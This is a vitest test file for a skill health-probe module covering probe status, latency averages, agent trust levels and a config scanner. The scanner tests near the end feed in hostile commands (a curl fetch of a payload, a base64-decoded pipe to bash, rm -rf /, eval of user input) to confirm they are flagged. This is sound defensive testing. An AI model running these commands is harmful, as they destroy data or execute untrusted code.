import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import Database from 'better-sqlite3';
import {
  ensureSkillHealthTable,
  recordHealthProbe,
  getCardHealth,
  getSkillHealth,
  getSkillsByStatus,
  getAgentTrustLevel,
  scanSkillConfig,
} from './health-probe.js';

describe('health-probe', () => {
  let db: Database.Database;

  beforeEach(() => {
    db = new Database(':memory:');
    ensureSkillHealthTable(db);
  });

  afterEach(() => { db.close(); });

  describe('recordHealthProbe', () => {
    it('records a successful probe', () => {
      recordHealthProbe(db, 'card-1', 'tts', { skill_id: 'tts', status: 'ok', latency_ms: 150 });

      const health = getSkillHealth(db, 'card-1', 'tts');
      expect(health).not.toBeNull();
      expect(health!.status).toBe('ok');
      expect(health!.avg_latency_ms).toBe(150);
      expect(health!.consecutive_failures).toBe(0);
      expect(health!.total_checks).toBe(1);
      expect(health!.total_successes).toBe(1);
    });

    it('records a failed probe as degraded', () => {
      recordHealthProbe(db, 'card-1', 'tts', { skill_id: 'tts', status: 'error', latency_ms: 0 });

      const health = getSkillHealth(db, 'card-1', 'tts');
      expect(health!.status).toBe('degraded');
      expect(health!.consecutive_failures).toBe(1);
    });

    it('marks offline after 3 consecutive failures', () => {
      for (let i = 0; i < 3; i++) {
        recordHealthProbe(db, 'card-1', 'tts', { skill_id: 'tts', status: 'error', latency_ms: 0 });
      }

      const health = getSkillHealth(db, 'card-1', 'tts');
      expect(health!.status).toBe('offline');
      expect(health!.consecutive_failures).toBe(3);
    });

    it('resets failures on success', () => {
      recordHealthProbe(db, 'card-1', 'tts', { skill_id: 'tts', status: 'error', latency_ms: 0 });
      recordHealthProbe(db, 'card-1', 'tts', { skill_id: 'tts', status: 'error', latency_ms: 0 });
      recordHealthProbe(db, 'card-1', 'tts', { skill_id: 'tts', status: 'ok', latency_ms: 100 });

      const health = getSkillHealth(db, 'card-1', 'tts');
      expect(health!.status).toBe('ok');
      expect(health!.consecutive_failures).toBe(0);
    });

    it('calculates rolling average latency', () => {
      recordHealthProbe(db, 'card-1', 'tts', { skill_id: 'tts', status: 'ok', latency_ms: 100 });
      recordHealthProbe(db, 'card-1', 'tts', { skill_id: 'tts', status: 'ok', latency_ms: 200 });

      const health = getSkillHealth(db, 'card-1', 'tts');
      expect(health!.avg_latency_ms).toBe(150); // (100 + 200) / 2
    });
  });

  describe('getCardHealth', () => {
    it('returns health for all skills of a card', () => {
      recordHealthProbe(db, 'card-1', 'tts', { skill_id: 'tts', status: 'ok', latency_ms: 100 });
      recordHealthProbe(db, 'card-1', 'stt', { skill_id: 'stt', status: 'ok', latency_ms: 200 });

      const health = getCardHealth(db, 'card-1');
      expect(health.length).toBe(2);
    });

    it('returns empty array for unknown card', () => {
      expect(getCardHealth(db, 'nope')).toEqual([]);
    });
  });

  describe('getSkillsByStatus', () => {
    it('filters by status', () => {
      recordHealthProbe(db, 'card-1', 'tts', { skill_id: 'tts', status: 'ok', latency_ms: 100 });
      recordHealthProbe(db, 'card-2', 'stt', { skill_id: 'stt', status: 'error', latency_ms: 0 });

      expect(getSkillsByStatus(db, 'ok').length).toBe(1);
      expect(getSkillsByStatus(db, 'degraded').length).toBe(1);
    });
  });

  describe('getAgentTrustLevel', () => {
    it('returns new for agent with no transactions', () => {
      // Create credit_transactions table
      db.exec(`CREATE TABLE IF NOT EXISTS credit_transactions (
        id TEXT PRIMARY KEY, owner TEXT, amount INTEGER, reason TEXT, reference_id TEXT, created_at TEXT
      )`);
      expect(getAgentTrustLevel(db, 'agent-1')).toBe('new');
    });

    it('returns verified for agent with 10+ settlements', () => {
      db.exec(`CREATE TABLE IF NOT EXISTS credit_transactions (
        id TEXT PRIMARY KEY, owner TEXT, amount INTEGER, reason TEXT, reference_id TEXT, created_at TEXT
      )`);
      for (let i = 0; i < 10; i++) {
        db.prepare(
          'INSERT INTO credit_transactions (id, owner, amount, reason, reference_id, created_at) VALUES (?, ?, ?, ?, ?, ?)',
        ).run(`tx-${i}`, 'agent-1', 10, 'settlement', null, new Date().toISOString());
      }
      expect(getAgentTrustLevel(db, 'agent-1')).toBe('verified');
    });
  });

  describe('scanSkillConfig', () => {
    it('returns empty for clean config', () => {
      expect(scanSkillConfig({ command: 'node server.js', args: ['--port', '3000'] })).toEqual([]);
    });

    it('detects curl to raw IP', () => {
      const warnings = scanSkillConfig({ command: 'curl http://192.168.1.50/payload' });
      expect(warnings.length).toBeGreaterThan(0);
    });

    it('detects base64 decode', () => {
      const warnings = scanSkillConfig({ command: 'echo payload | base64 -d | bash' });
      expect(warnings.length).toBeGreaterThan(0);
    });

    it('detects destructive rm', () => {
      const warnings = scanSkillConfig({ command: 'rm -rf / --no-preserve-root' });
      expect(warnings.length).toBeGreaterThan(0);
    });

    it('detects eval', () => {
      const warnings = scanSkillConfig({ script: 'eval(user_input)' });
      expect(warnings.length).toBeGreaterThan(0);
    });
  });
});
